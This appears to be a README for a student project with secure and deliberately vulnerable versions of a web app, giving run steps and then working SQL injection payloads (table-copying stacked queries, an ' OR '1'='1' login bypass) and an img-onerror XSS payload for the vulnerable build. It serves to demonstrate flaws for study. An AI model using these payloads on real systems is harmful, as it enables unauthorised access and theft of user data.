How to run our project:
This project is splitted to 2 versions: secure and vulnerable.
In order to run the secure version -
open terminal -> cd cyber-server-secure -> npm start
open terminal -> cd cyber-client-secure -> set port=3001 && npm start

In order to run the vulnerable version -
open terminal -> cd cyber-server-vulnerable -> npm start
open terminal -> cd cyber-client-vulnerable -> npm start

(make sure you run mysql)

SQL injection:
register:
in the first name field:
test', 'last', 'email@test.com', 'Secpass123','pkg'); CREATE TABLE users_hacked AS SELECT * FROM users; -- 
(the rest doesnt matter)

The injection will let the hacker to create users_hacked table in the database with all the users info from the original table

login:
email- ' OR '1'='1' -- (IMPORTANT: HAVE A SPACE IN THE LAST CHAR) 
password- anything

The injection will let the hacker to log in without valid credantials


add client-
in the first name field:
x', 'last', 'email', 'phone', 'addr','pkg'); CREATE TABLE clients_hacked AS SELECT * FROM clients; -- 
(the rest doesnt matter)

The injection will let the hacker to create clients_hacked table in the database with all the clients info from the original table


XSS attack - 
in the first name field:
<img src=x onerror="alert(`XSS ATTACK!`)">
(the rest doesnt matter)
will show an alert dialog with content - XSS ATTACK!
